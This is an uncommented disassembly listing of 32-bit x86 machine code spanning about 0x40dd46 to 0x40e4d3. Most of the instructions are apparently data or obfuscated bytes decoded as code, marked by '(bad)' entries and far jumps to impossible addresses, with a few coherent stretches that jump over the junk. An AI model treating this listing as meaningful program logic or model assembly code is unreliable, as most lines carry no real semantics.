  40dd46:	adc    DWORD PTR ds:0x42a871,0x42a87d
  40dd50:	xor    eax,esi
  40dd52:	jmp    0x40dfaa
  40dd57:	rol    eax,0x3e
  40dd5a:	leave  
  40dd5b:	leave  
  40dd5c:	leave  
  40dd5d:	leave  
  40dd5e:	rcr    BYTE PTR [ebx+0x66],0x3b
  40dd62:	inc    esi
  40dd63:	push   0xffffffba
  40dd65:	push   esp
  40dd66:	add    al,0xd3
  40dd68:	lods   al,BYTE PTR ds:[esi]
  40dd69:	js     0x40dde3
  40dd6b:	xor    eax,0x9678787e
  40dd70:	mov    ah,0xbe
  40dd72:	and    eax,DWORD PTR [eax+eax*4]
  40dd75:	cmp    eax,0x99c50958
  40dd7a:	pusha  
  40dd7b:	ror    dh,0xb0
  40dd7e:	xor    al,0x15
  40dd80:	sbb    eax,0xcd07e36d
  40dd85:	and    ecx,DWORD PTR [edi]
  40dd87:	ret    
  40dd88:	outs   dx,DWORD PTR ds:[esi]
  40dd89:	aad    0x6c
  40dd8b:	aaa    
  40dd8c:	js     0x40dd65
  40dd8e:	sub    eax,0x16449552
  40dd93:	xchg   ecx,eax
  40dd94:	xchg   ecx,eax
  40dd95:	pop    edx
  40dd96:	inc    esp
  40dd97:	sbb    esi,DWORD PTR [ebp-0x62]
  40dd9a:	and    dl,BYTE PTR [ebp+0x4b]
  40dd9d:	std    
  40dd9e:	pop    ebx
  40dd9f:	adc    al,0x2e
  40dda1:	add    al,0x14
  40dda3:	inc    edi
  40dda4:	inc    ebp
  40dda5:	push   eax
  40dda6:	cli    
  40dda7:	dec    edi
  40dda8:	in     al,dx
  40dda9:	mov    eax,gs:0xc3668d93
  40ddaf:	ror    BYTE PTR [eax-0x72da53c1],0x99
  40ddb6:	loopne 0x40ddd0
  40ddb8:	test   eax,0x849317ed
  40ddbd:	add    dh,BYTE PTR [ebx+0x31]
  40ddc0:	iret   
  40ddc1:	into   
  40ddc2:	retf   0xac39
  40ddc5:	lods   eax,DWORD PTR ds:[esi]
  40ddc6:	inc    esp
  40ddc7:	(bad)  
  40ddc8:	lods   al,BYTE PTR ds:[esi]
  40ddc9:	cmp    dl,BYTE PTR [ebx]
  40ddcb:	sbb    DWORD PTR [edx],0xfffffffc
  40ddce:	popa   
  40ddcf:	jp     0x40de11
  40ddd1:	(bad)  
  40ddd2:	push   esp
  40ddd3:	rcr    esp,1
  40ddd5:	xor    al,0x7e
  40ddd7:	sbb    DWORD PTR [ebp+esi*2-0x35e54c9f],edx
  40ddde:	pop    ebp
  40dddf:	or     al,0x99
  40dde1:	jp     0x40dd98
  40dde3:	(bad)  
  40dde4:	mov    al,0xc0
  40dde6:	cmp    esp,DWORD PTR [eax]
  40dde8:	pop    ss
  40dde9:	outs   dx,DWORD PTR ds:[esi]
  40ddea:	fmul   QWORD PTR [eax+edx*8]
  40dded:	stc    
  40ddee:	push   0xfffffffe
  40ddf0:	jmp    DWORD PTR [edi-0x2bbf3f47]
  40ddf6:	or     edi,ebx
  40ddf8:	outs   dx,BYTE PTR ds:[esi]
  40ddf9:	cmp    eax,0xa935965
  40ddfe:	or     ah,al
  40de00:	sub    BYTE PTR [edi],cl
  40de02:	div    DWORD PTR [ebp-0x2c522bd0]
  40de08:	jecxz  0x40ddf1
  40de0a:	xor    ch,BYTE PTR [edx]
  40de0c:	div    BYTE PTR [ecx]
  40de0e:	dec    BYTE PTR [ebx-0x19]
  40de11:	mov    edi,0xbe71c83b
  40de16:	xchg   esp,eax
  40de17:	dec    esp
  40de18:	xchg   edx,eax
  40de19:	(bad)  
  40de1a:	retf   
  40de1b:	rol    DWORD PTR [ecx+0x62],cl
  40de1e:	or     esp,DWORD PTR [edi-0x57]
  40de21:	xor    al,0xb0
  40de23:	lahf   
  40de24:	popf   
  40de25:	and    eax,edi
  40de27:	outs   dx,DWORD PTR ds:[esi]
  40de28:	xchg   ebp,eax
  40de29:	outs   dx,DWORD PTR ds:[esi]
  40de2a:	aaa    
  40de2b:	and    BYTE PTR [edi],al
  40de2d:	mov    bh,0xc7
  40de2f:	push   ebx
  40de30:	xchg   esp,eax
  40de31:	mov    al,cl
  40de33:	jne    0x40de21
  40de35:	pop    esp
  40de36:	adc    BYTE PTR [eax],bl
  40de38:	imul   BYTE PTR [ebp-0x732058d9]
  40de3e:	mov    ds:0xe4736f,eax
  40de43:	xlat   BYTE PTR ds:[ebx]
  40de44:	push   esi
  40de45:	push   ss
  40de46:	pop    edi
  40de47:	jecxz  0x40dea1
  40de49:	mov    eax,ds:0xd820457c
  40de4e:	gs pop eax
  40de50:	(bad)  
  40de51:	mov    esi,DWORD PTR [esi]
  40de53:	arpl   WORD PTR [ebp+0x2c],ax
  40de56:	jmp    0xed42:0x24cf42af
  40de5d:	sbb    DWORD PTR [edx+0x7b],esp
  40de60:	adc    eax,DWORD PTR [ebx+0xb391e30]
  40de66:	inc    eax
  40de67:	lock shl DWORD PTR [edx-0x1cce989d],1
  40de6e:	and    DWORD PTR [eax+0x6e8bd182],esi
  40de74:	cdq    
  40de75:	sbb    al,0xb7
  40de77:	div    esp
  40de79:	ins    BYTE PTR es:[edi],dx
  40de7a:	xchg   esp,eax
  40de7b:	lea    edx,[ecx-0x2c29e9aa]
  40de81:	pop    ecx
  40de82:	sub    al,0x88
  40de84:	push   esp
  40de85:	cdq    
  40de86:	pop    esi
  40de87:	mov    ebx,0xe2de281b
  40de8c:	sbb    al,0xba
  40de8e:	inc    ecx
  40de8f:	imul   edx,DWORD PTR [ebp+0xe],0xfffffff3
  40de93:	std    
  40de94:	mov    dh,cl
  40de96:	push   ss
  40de97:	pop    esi
  40de98:	add    al,0xf1
  40de9a:	add    BYTE PTR [ebx],dh
  40de9c:	mov    WORD PTR ds:0xbe4c2c61,?
  40dea2:	sbb    al,0x1c
  40dea4:	dec    ecx
  40dea5:	call   0x8f7a:0x6f8aa12c
  40deac:	add    al,0x57
  40deae:	mov    eax,ds:0x4c2b385f
  40deb3:	js     0x40decc
  40deb5:	loope  0x40df10
  40deb7:	imul   ebp,DWORD PTR [edi+0x15],0x2f
  40debb:	rcl    DWORD PTR [ebp+0x1bd37264],1
  40dec1:	std    
  40dec2:	cmp    eax,0xd2cc66b4
  40dec7:	inc    eax
  40dec8:	(bad)  
  40dec9:	fild   DWORD PTR [edx+esi*1+0x61]
  40decd:	(bad)  
  40dece:	mov    edi,0x84aaa8d5
  40ded3:	test   eax,0x52a8d7e7
  40ded8:	jle    0x40df02
  40deda:	fwait
  40dedb:	or     ebx,DWORD PTR [esp+ecx*2+0x39]
  40dedf:	jmp    0x40de81
  40dee1:	inc    esi
  40dee2:	or     al,0x61
  40dee4:	nop
  40dee5:	stos   BYTE PTR es:[edi],al
  40dee6:	hlt    
  40dee7:	js     0x40debc
  40dee9:	pop    ebp
  40deea:	add    edx,DWORD PTR [eax-0x2]
  40deed:	cli    
  40deee:	mov    bl,BYTE PTR [edi]
  40def0:	jmp    0x40df1a
  40def2:	cmp    DWORD PTR [edx+0x47],eax
  40def5:	cmp    cl,BYTE PTR [esi+0x53370c2c]
  40defb:	jmp    0x40df5f
  40defd:	push   ecx
  40defe:	addr16 jnp 0x40dec3
  40df01:	or     eax,0xf0d9fca6
  40df06:	pop    ebx
  40df07:	or     DWORD PTR [edi],edx
  40df09:	sbb    BYTE PTR [edx-0x1c1b03a7],0x15
  40df10:	xchg   BYTE PTR [ebp-0x9420010],bh
  40df16:	inc    edi
  40df17:	inc    ebp
  40df18:	(bad)  
  40df1a:	mov    esi,0xaaf43129
  40df1f:	addr16 aad 0x77
  40df22:	int3   
  40df23:	mov    eax,DWORD PTR [ebp+0x79dfde2]
  40df29:	pop    edx
  40df2a:	mov    ah,0xf9
  40df2c:	retf   0xba3c
  40df2f:	ret    0x84be
  40df32:	jmp    esp
  40df34:	enter  0x717a,0x1d
  40df38:	idiv   BYTE PTR [edx]
  40df3a:	cmp    eax,0x92f1120e
  40df3f:	lea    edx,[esi+0x6524da5]
  40df45:	jecxz  0x40df37
  40df47:	sbb    DWORD PTR [ebp-0x2d4a31d],edx
  40df4d:	jp     0x40df47
  40df4f:	lock push ss
  40df51:	cwde   
  40df52:	mov    eax,0x7191c3ef
  40df57:	mov    dh,0x52
  40df59:	les    eax,FWORD PTR [ecx-0x3a]
  40df5c:	call   0x81e0f277
  40df61:	or     al,0xbf
  40df63:	neg    BYTE PTR ds:0x2897dfc6
  40df69:	add    DWORD PTR [ecx],0x83869dd1
  40df6f:	in     al,0x21
  40df71:	js     0x40df63
  40df73:	adc    al,BYTE PTR [ebp-0x58]
  40df76:	enter  0x6d9b,0xba
  40df7a:	rol    BYTE PTR [ecx+edi*8+0x62a97970],cl
  40df81:	fadd   DWORD PTR [eax-0x7fe85bad]
  40df87:	dec    ecx
  40df88:	fbld   TBYTE PTR [esi+0x4c5dc32e]
  40df8e:	xor    ch,BYTE PTR [eax-0x13fdfc7]
  40df94:	add    ebx,DWORD PTR [edx]
  40df96:	pop    edx
  40df97:	pop    es
  40df98:	jle    0x40dfe6
  40df9a:	std    
  40df9b:	push   ss
  40df9c:	and    BYTE PTR [edi],cl
  40df9e:	cmc    
  40df9f:	push   cs
  40dfa0:	test   dl,bh
  40dfa2:	mov    ah,0x35
  40dfa4:	add    BYTE PTR ds:0x2c031ca4,dl
  40dfaa:	add    eax,ebx
  40dfac:	mov    DWORD PTR [ebp-0x54],eax
  40dfaf:	not    DWORD PTR ds:0x42a839
  40dfb5:	lea    eax,[ebp-0x1c]
  40dfb8:	mov    DWORD PTR [ebp-0x50],eax
  40dfbb:	mov    eax,DWORD PTR [ebp-0x60]
  40dfbe:	xor    eax,esi
  40dfc0:	add    eax,ebx
  40dfc2:	mov    DWORD PTR [ebp-0x60],eax
  40dfc5:	lea    eax,[ebp-0x60]
  40dfc8:	push   eax
  40dfc9:	mov    eax,DWORD PTR [ebp+0xc]
  40dfcc:	jmp    0x40e224
  40dfd1:	ds cmp eax,0xd1d1d2d2
  40dfd7:	rol    DWORD PTR ds:[ecx-0x5bfbec6],1
  40dfde:	iret   
  40dfdf:	mov    al,0xbe
  40dfe1:	mov    BYTE PTR [edx+0x7e357878],dh
  40dfe7:	js     0x40e061
  40dfe9:	xchg   cx,ax
  40dfeb:	dec    edi
  40dfec:	add    eax,0xdec7f525
  40dff1:	add    al,0xb6
  40dff3:	xor    al,0xe7
  40dff5:	in     eax,0xf
  40dff7:	jno    0x40e01f
  40dff9:	push   esp
  40dffa:	les    edx,FWORD PTR [ebx-0x4b20df8e]
  40e000:	cld    
  40e001:	sub    DWORD PTR [ebp-0x856835f],0x8619d4c8
  40e00b:	(bad)  
  40e00c:	test   DWORD PTR [esi+0x1d],0x71e1d46
  40e013:	les    ecx,FWORD PTR [edi]
  40e015:	cmc    
  40e016:	fdivr  st,st(4)
  40e018:	shr    DWORD PTR [edx-0x1],cl
  40e01b:	jp     0x40dfa7
  40e01d:	push   ds
  40e01e:	push   ds
  40e01f:	jnp    0x40e05a
  40e021:	stos   BYTE PTR es:[edi],al
  40e022:	ficomp DWORD PTR [edi-0x63]
  40e025:	inc    edx
  40e026:	jne    0x40dfbd
  40e028:	fiadd  DWORD PTR [ebp-0x3d0b6523]
  40e02e:	in     eax,0x87
  40e030:	fild   QWORD PTR [ebp+0x3e]
  40e033:	stc    
  40e034:	xor    ebp,DWORD PTR [edi-0x59c33236]
  40e03a:	fs and eax,0xf768ac10
  40e040:	test   BYTE PTR [ebx+ebx*1],dh
  40e043:	jmp    0x69e3:0xfe79ccc9
  40e04a:	push   0x10
  40e04c:	dec    eax
  40e04d:	xor    DWORD PTR [esi+ebx*4+0x7b],ebx
  40e051:	pavgb  mm3,QWORD PTR [edx]
  40e054:	or     ebp,DWORD PTR [ebx-0x6fa1e2ae]
  40e05a:	out    0xf,eax
  40e05c:	mov    cl,0x1d
  40e05e:	(bad)  [ecx]
  40e060:	add    esi,ebp
  40e062:	add    eax,0x77052f5
  40e067:	sbb    al,BYTE PTR [eax-0xa558219]
  40e06d:	dec    ebx
  40e06e:	push   cs
  40e06f:	sbb    al,0xc1
  40e071:	sbb    ebp,ecx
  40e073:	stos   DWORD PTR es:[edi],eax
  40e074:	xlat   BYTE PTR ds:[ebx]
  40e075:	inc    ebx
  40e076:	mov    ebp,0xe27855ea
  40e07b:	jp     0x40e065
  40e07d:	inc    esp
  40e07e:	je     0x40e08e
  40e080:	or     eax,0xdcccdfdf
  40e085:	xchg   esp,eax
  40e086:	add    al,0xf0
  40e088:	xor    al,0xf6
  40e08a:	xor    BYTE PTR [ecx-0x69],al
  40e08d:	sub    DWORD PTR [ebp+0x76],0x6d773acd
  40e094:	pushf  
  40e095:	bound  esi,QWORD PTR [ebx+0x54]
  40e098:	mov    edx,0x5a7de716
  40e09d:	addr16 xchg esp,eax
  40e09f:	push   0x20
  40e0a1:	jno    0x40e0a5
  40e0a3:	dec    ebp
  40e0a4:	mov    WORD PTR [eax-0x4beb6d63],?
  40e0aa:	pop    edx
  40e0ab:	loope  0x40e092
  40e0ad:	pcmpgtd mm4,mm4
  40e0b0:	loope  0x40e0bd
  40e0b2:	push   esp
  40e0b3:	or     al,0xf
  40e0b5:	sbb    BYTE PTR [edi-0x2d5052c3],dl
  40e0bb:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40e0bd:	dec    edi
  40e0be:	arpl   WORD PTR [esi+0x40],sp
  40e0c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0c2:	aad    0x7f
  40e0c4:	jge    0x40e049
  40e0c6:	mov    BYTE PTR [eax-0x77da077b],bh
  40e0cc:	mov    ebx,0xebc414df
  40e0d1:	sbb    BYTE PTR [edi],cl
  40e0d3:	mov    esp,0x65c1a9a4
  40e0d8:	loop   0x40e0c3
  40e0da:	add    bl,BYTE PTR [ebp-0x72]
  40e0dd:	bound  esp,QWORD PTR [esi]
  40e0df:	add    BYTE PTR [edi+0x602bc12a],ah
  40e0e5:	xor    eax,esi
  40e0e7:	or     DWORD PTR [ecx+eax*1],edi
  40e0ea:	adc    DWORD PTR [esi-0x1e],edi
  40e0ed:	fisubr WORD PTR [ecx-0x17a7c34d]
  40e0f3:	(bad)  
  40e0f4:	pushf  
  40e0f5:	sub    al,0x3a
  40e0f7:	icebp  
  40e0f8:	adc    BYTE PTR [edx-0x521ac66a],bl
  40e0fe:	or     eax,eax
  40e100:	push   ecx
  40e101:	mov    ds:0x57ad93c,eax
  40e106:	dec    edx
  40e107:	jns    0x40e0fd
  40e109:	ret    
  40e10a:	mov    esi,0xee57185d
  40e10f:	jnp    0x40e096
  40e111:	test   al,al
  40e113:	cdq    
  40e114:	data16 (bad) 
  40e116:	jl     0x40e0f9
  40e118:	lods   al,BYTE PTR ds:[esi]
  40e119:	aad    0x8
  40e11b:	jmp    0x176f490d
  40e120:	nop
  40e121:	icebp  
  40e122:	bound  eax,QWORD PTR [ebx]
  40e124:	inc    esp
  40e125:	lods   eax,DWORD PTR ds:[esi]
  40e126:	mov    bh,0xcd
  40e128:	push   ecx
  40e129:	xor    BYTE PTR [ecx+ebp*4],0xe3
  40e12d:	mov    ch,0x77
  40e12f:	adc    eax,0x669b615f
  40e134:	jns    0x40e128
  40e136:	and    al,0x50
  40e138:	imul   BYTE PTR [edi]
  40e13a:	sbb    BYTE PTR [ebp+eax*4-0x45],dl
  40e13e:	adc    DWORD PTR [ecx],0xffffffae
  40e141:	jno    0x40e13e
  40e143:	(bad)  
  40e144:	push   edx
  40e145:	jb     0x40e139
  40e147:	pusha  
  40e148:	push   ds
  40e149:	cs inc ebp
  40e14b:	jmp    0xec4:0x5ceb28a1
  40e152:	js     0x40e194
  40e154:	xchg   ebp,eax
  40e155:	push   eax
  40e156:	sar    DWORD PTR [edx],cl
  40e158:	lock ja 0x40e140
  40e15b:	daa    
  40e15c:	xlat   BYTE PTR ds:[ebx]
  40e15d:	pop    eax
  40e15e:	fsubr  QWORD PTR [edx-0xf]
  40e161:	mov    bl,0xc7
  40e163:	xchg   edx,eax
  40e164:	das    
  40e165:	imul   esi,ecx,0xffffffbb
  40e168:	rol    DWORD PTR ds:0x506eda,1
  40e16e:	cmp    bh,al
  40e170:	mov    ah,0x4b
  40e172:	das    
  40e173:	or     eax,edx
  40e175:	jae    0x40e1cf
  40e177:	dec    esi
  40e178:	fisubr WORD PTR [ecx-0x4d]
  40e17b:	pusha  
  40e17c:	test   DWORD PTR [edx-0x12e3a3dd],0xd995e5af
  40e186:	inc    esp
  40e187:	mov    ebx,?
  40e189:	adc    al,0x96
  40e18b:	lahf   
  40e18c:	test   bl,bl
  40e18e:	lods   eax,DWORD PTR ds:[esi]
  40e18f:	fbstp  TBYTE PTR [eax+0x7d]
  40e192:	mul    BYTE PTR [edi-0x2dcfcab4]
  40e198:	cmp    al,0x9
  40e19a:	jmp    0xf4c5:0x3beed442
  40e1a1:	enter  0xc668,0xd7
  40e1a5:	shl    DWORD PTR [esi],1
  40e1a7:	push   cs
  40e1a8:	das    
  40e1a9:	inc    ebp
  40e1aa:	xchg   ebx,eax
  40e1ab:	js     0x40e1c8
  40e1ad:	push   ss
  40e1ae:	fs cli 
  40e1b0:	or     DWORD PTR [ebx],ebx
  40e1b2:	(bad)  
  40e1b4:	push   0x9bd923aa
  40e1b9:	jmp    0x40e1d1
  40e1bb:	stc    
  40e1bc:	out    dx,al
  40e1bd:	dec    edi
  40e1be:	ret    
  40e1bf:	push   edx
  40e1c0:	cmp    esi,DWORD PTR [edx-0x179eb239]
  40e1c6:	jecxz  0x40e1ce
  40e1c8:	pop    es
  40e1c9:	ins    DWORD PTR es:[edi],dx
  40e1ca:	(bad)  
  40e1cb:	push   ecx
  40e1cc:	jo     0x40e156
  40e1ce:	pop    edx
  40e1cf:	mov    al,0xbd
  40e1d1:	sub    edi,esp
  40e1d3:	pop    ss
  40e1d4:	idiv   DWORD PTR ds:0x4aeb9ecc
  40e1da:	jecxz  0x40e23f
  40e1dc:	test   bh,ah
  40e1de:	cdq    
  40e1df:	ins    DWORD PTR es:[edi],dx
  40e1e0:	push   eax
  40e1e1:	mov    ecx,0x6124a8d5
  40e1e6:	xlat   BYTE PTR ds:[ebx]
  40e1e7:	mov    ecx,0x47b469f
  40e1ec:	(bad)  
  40e1ed:	mov    ?,WORD PTR [ebp-0x4c967643]
  40e1f3:	push   0x765cfb15
  40e1f8:	loopne 0x40e238
  40e1fa:	adc    al,cl
  40e1fc:	pop    esi
  40e1fd:	sahf   
  40e1fe:	out    dx,eax
  40e1ff:	mov    WORD PTR [esp+esi*1-0x68],fs
  40e203:	mov    ds:0xaca02f4,al
  40e208:	out    dx,eax
  40e209:	sub    dl,BYTE PTR [ecx]
  40e20b:	dec    edx
  40e20c:	lahf   
  40e20d:	pop    esi
  40e20e:	dec    esp
  40e20f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e210:	inc    ebp
  40e211:	shr    al,0x66
  40e214:	jnp    0x40e234
  40e216:	jno    0x40e283
  40e218:	or     eax,0xc9c32300
  40e21d:	sbb    ch,BYTE PTR [ebx-0x19c8ce2b]
  40e223:	jb     0x40e258
  40e225:	mov    BYTE PTR [ebx],0xc3
  40e228:	push   eax
  40e229:	jmp    0x40e481
  40e22e:	(bad)  
  40e22f:	xlat   BYTE PTR ds:[ebx]
  40e230:	(bad)  
  40e231:	retf   0xc9d5
  40e234:	fcmovu st,st(3)
  40e236:	aas    
  40e237:	cmp    al,0x7f
  40e239:	push   es
  40e23a:	jb     0x40e1ee
  40e23c:	or     al,0x62
  40e23e:	inc    ebp
  40e23f:	mov    al,0x78
  40e241:	js     0x40e278
  40e243:	jle    0x40e2bd
  40e245:	js     0x40e1cb
  40e247:	add    al,0xda
  40e249:	nop
  40e24a:	sahf   
  40e24b:	xchg   BYTE PTR [ecx+0x37],dh
  40e24e:	dec    esp
  40e24f:	fidivr DWORD PTR [ebx+0x5b]
  40e252:	pop    esp
  40e253:	pop    esp
  40e254:	in     eax,0x5b
  40e256:	outs   dx,DWORD PTR ds:[esi]
  40e257:	pop    es
  40e258:	jb     0x40e2c7
  40e25a:	(bad)  
  40e25b:	mov    DWORD PTR [ebx+0x44],ebx
  40e25e:	ja     0x40e2b1
  40e260:	retf   
  40e261:	das    
  40e262:	ds std 
  40e264:	(bad)  
  40e265:	lods   eax,DWORD PTR ds:[esi]
  40e266:	xchg   ebp,eax
  40e267:	or     al,0x2d
  40e269:	int3   
  40e26a:	data16 mov dl,0x9b
  40e26d:	adc    ebp,DWORD PTR [ebp+0x1cc646ae]
  40e273:	loopne 0x40e2c7
  40e275:	mov    edx,0xda532230
  40e27a:	scas   al,BYTE PTR es:[edi]
  40e27b:	mov    al,ds:0xdd46caa8
  40e280:	jmp    0xe5d3:0x7a4210ba
  40e287:	out    dx,al
  40e288:	fisub  WORD PTR [eax]
  40e28a:	jmp    0x24c250c3
  40e28f:	jg     0x40e25f
  40e291:	mov    esp,0xc0d04887
  40e296:	lods   eax,DWORD PTR ds:[esi]
  40e297:	dec    eax
  40e298:	xor    edx,ebx
  40e29a:	call   0x919f:0xdb92fc44
  40e2a1:	xor    eax,0xa40e9744
  40e2a6:	push   esi
  40e2a7:	jg     0x40e2ab
  40e2a9:	inc    esp
  40e2aa:	push   esi
  40e2ab:	icebp  
  40e2ac:	pop    esi
  40e2ad:	fimul  WORD PTR [eax]
  40e2af:	aaa    
  40e2b0:	in     eax,0x71
  40e2b2:	fcmove st,st(6)
  40e2b4:	xchg   ebp,eax
  40e2b5:	jle    0x40e283
  40e2b7:	dec    edi
  40e2b8:	loope  0x40e2c2
  40e2ba:	sub    eax,ebp
  40e2bc:	push   0x2f91f09d
  40e2c1:	lods   eax,DWORD PTR ds:[esi]
  40e2c2:	dec    edx
  40e2c3:	sbb    BYTE PTR [ecx+edi*8],0xb9
  40e2c7:	push   ss
  40e2c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2c9:	sub    BYTE PTR [ebx],dl
  40e2cb:	inc    esi
  40e2cc:	sub    BYTE PTR [ecx-0x1b],dl
  40e2cf:	xor    dl,BYTE PTR [edx-0x2d052ab0]
  40e2d5:	pop    edi
  40e2d6:	or     eax,0x52eb26eb
  40e2db:	sti    
  40e2dc:	lock in eax,0xc6
  40e2df:	or     BYTE PTR [edx],ah
  40e2e1:	xchg   esp,eax
  40e2e2:	and    ebx,ecx
  40e2e4:	scas   ax,WORD PTR es:[edi]
  40e2e6:	ret    
  40e2e7:	inc    ebp
  40e2e8:	xchg   DWORD PTR [ebx],ebp
  40e2ea:	dec    ecx
  40e2eb:	mov    ?,esp
  40e2ed:	dec    eax
  40e2ee:	lods   eax,DWORD PTR ds:[esi]
  40e2ef:	xor    BYTE PTR [edi],0xc8
  40e2f2:	mov    al,ds:0x9b9629a6
  40e2f7:	fs ins BYTE PTR es:[edi],dx
  40e2f9:	mov    DWORD PTR [eax-0x3],esi
  40e2fc:	pop    es
  40e2fd:	xor    al,0x8a
  40e2ff:	aas    
  40e300:	mov    esi,DWORD PTR es:[edi+edi*4+0x9]
  40e305:	sbb    eax,0x37090135
  40e30a:	inc    ecx
  40e30b:	adc    dl,BYTE PTR gs:[ecx]
  40e30e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e30f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e310:	fld    DWORD PTR [esi+0x5f6faeb9]
  40e316:	fsub   DWORD PTR [ecx-0x26d9edd3]
  40e31c:	pop    edi
  40e31d:	dec    esp
  40e31e:	sahf   
  40e31f:	xor    al,0x59
  40e321:	jl     0x40e2d4
  40e323:	lea    esp,ds:0x4bf29133
  40e329:	jo     0x40e3a6
  40e32b:	loope  0x40e2c9
  40e32d:	jo     0x40e304
  40e32f:	into   
  40e330:	mov    ebx,0x1f992532
  40e335:	js     0x40e341
  40e337:	push   0xffffffdb
  40e339:	clc    
  40e33a:	cmp    esi,eax
  40e33c:	call   0x5eeb:0x7f11109d
  40e343:	or     al,0xb0
  40e345:	pop    eax
  40e346:	push   esi
  40e347:	ret    0xb417
  40e34a:	adc    eax,0x344e3612
  40e34f:	(bad)  
  40e350:	jne    0x40e3c8
  40e352:	ins    DWORD PTR es:[edi],dx
  40e353:	fdiv   DWORD PTR [eax+edi*2+0x3936c61e]
  40e35a:	lods   eax,DWORD PTR ds:[esi]
  40e35b:	xor    ebx,DWORD PTR [eax-0x3d]
  40e35e:	inc    eax
  40e35f:	fst    QWORD PTR [edi+eiz*2-0x4e]
  40e363:	ss fs int3 
  40e366:	dec    ebx
  40e367:	leave  
  40e368:	mov    edx,0xe5a6e53a
  40e36d:	add    al,0x33
  40e36f:	dec    esp
  40e370:	pushf  
  40e371:	stos   DWORD PTR es:[edi],eax
  40e372:	cdq    
  40e373:	imul   ebp,DWORD PTR [esi-0x24],0xb7fcd097
  40e37a:	dec    esi
  40e37b:	clc    
  40e37c:	adc    bh,BYTE PTR [bx+si]
  40e37f:	mov    eax,ds:0x44c1b05
  40e384:	push   ebx
  40e385:	int3   
  40e386:	hlt    
  40e387:	sub    ecx,DWORD PTR [edi-0x30bf7f48]
  40e38d:	int3   
  40e38e:	repz pop esp
  40e390:	es stos BYTE PTR es:[edi],al
  40e392:	(bad)  
  40e393:	fiadd  DWORD PTR [edx-0x69e4ca35]
  40e399:	or     al,0xac
  40e39b:	lock adc eax,0x23039f7d
  40e3a1:	jb     0x40e356
  40e3a3:	and    al,0x9a
  40e3a5:	out    0xe5,al
  40e3a7:	jp     0x40e3b9
  40e3a9:	dec    esp
  40e3aa:	test   ebx,0xa3450c2a
  40e3b0:	pop    ss
  40e3b1:	(bad)  
  40e3b2:	in     eax,dx
  40e3b3:	sub    dh,bl
  40e3b5:	test   al,0xe7
  40e3b7:	jg     0x40e33e
  40e3b9:	inc    ebx
  40e3ba:	(bad)  
  40e3bb:	lea    eax,[ebx-0x52ed79a5]
  40e3c1:	or     BYTE PTR [ebx-0x66a983df],0x4c
  40e3c8:	xor    edi,DWORD PTR [esi+ebx*4+0xa950a1b]
  40e3cf:	sbb    edi,DWORD PTR [esi+0x7e]
  40e3d2:	lea    edx,[ebx-0x77843f6]
  40e3d8:	into   
  40e3d9:	(bad)  
  40e3da:	mov    ebx,0xba15c559
  40e3df:	mov    esp,0x3e2a46d5
  40e3e4:	and    ch,al
  40e3e6:	mov    ah,0xe9
  40e3e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e3e9:	cdq    
  40e3ea:	pop    ss
  40e3eb:	ret    
  40e3ec:	das    
  40e3ed:	sbb    al,0x6e
  40e3ef:	jge    0x40e411
  40e3f1:	dec    eax
  40e3f2:	stos   BYTE PTR es:[edi],al
  40e3f3:	jb     0x40e426
  40e3f5:	inc    DWORD PTR [esi]
  40e3f7:	push   edx
  40e3f8:	or     ecx,0x84075904
  40e3fe:	in     al,dx
  40e3ff:	xchg   esp,eax
  40e400:	and    ecx,DWORD PTR [edi-0x8]
  40e403:	bound  ebp,QWORD PTR [ebx-0x6d]
  40e406:	test   eax,0xa4eaf6a2
  40e40b:	sub    ebp,esp
  40e40d:	outs   dx,DWORD PTR ds:[esi]
  40e40e:	dec    edx
  40e40f:	jae    0x40e3ee
  40e411:	push   edi
  40e412:	call   0xba58:0xb752c166
  40e419:	xor    DWORD PTR [ebp-0x267e2ba6],0xecdd37dc
  40e423:	mov    bl,BYTE PTR [ecx+ebp*1]
  40e426:	mov    DWORD PTR [edx-0x65],ebp
  40e429:	call   0xb10cad2
  40e42e:	int    0x72
  40e430:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e431:	add    BYTE PTR [ebp-0x442c45ae],bh
  40e437:	test   DWORD PTR [edx+0xd],ebp
  40e43a:	sub    eax,0x4fb7db8a
  40e43f:	adc    dl,BYTE PTR [edi+0x3617f54]
  40e445:	sahf   
  40e446:	(bad)  
  40e447:	jnp    0x40e3d9
  40e449:	sub    dh,BYTE PTR ds:0x23d751d1
  40e44f:	ds aaa 
  40e451:	pop    ds
  40e452:	jmp    0x6529fe0a
  40e457:	call   FWORD PTR [ecx+0x6a]
  40e45a:	pop    eax
  40e45b:	aas    
  40e45c:	sub    bl,bh
  40e45e:	test   BYTE PTR [eax-0x79e9370],0x5
  40e465:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e466:	add    ebp,DWORD PTR [ebx+esi*4-0x63]
  40e46a:	or     esp,ebp
  40e46c:	mov    al,ds:0xe8e63563
  40e471:	pop    ebx
  40e472:	xchg   DWORD PTR [eax+0x98541fc],ebp
  40e478:	jnp    0x40e4d3
  40e47a:	or     eax,0xb5780caa
  40e47f:	loop   0x40e437
  40e481:	mov    eax,ds:0x41eb06
  40e486:	push   0x41ea5c
  40e48b:	push   DWORD PTR [eax]
  40e48d:	call   0x419198
  40e492:	jmp    0x40e979
  40e497:	cmp    edi,0x13c
  40e49d:	jne    0x40e979
  40e4a3:	mov    eax,DWORD PTR [ebp-0x10]
  40e4a6:	jmp    0x40e6fe
  40e4ab:	sar    DWORD PTR ds:[esi],0xca
  40e4af:	ror    ecx,0xca
  40e4b2:	leave  
  40e4b3:	(bad)  
  40e4b4:	dec    eax
  40e4b5:	cmc    
  40e4b6:	adc    ecx,DWORD PTR [edx+0x2fe9d4b]
  40e4bc:	mov    ch,0x78
  40e4be:	js     0x40e4f5
  40e4c0:	jle    0x40e53a
  40e4c2:	js     0x40e518
  40e4c4:	aad    0x55
  40e4c6:	dec    ecx
  40e4c7:	sub    DWORD PTR [edi+0x4aaf8770],ebx
  40e4cd:	pop    eax
  40e4ce:	out    dx,eax
  40e4cf:	push   DWORD PTR [ecx]
  40e4d1:	or     ebx,DWORD PTR [edx]
  40e4d3:	lods   al,BYTE PTR ds:[esi]
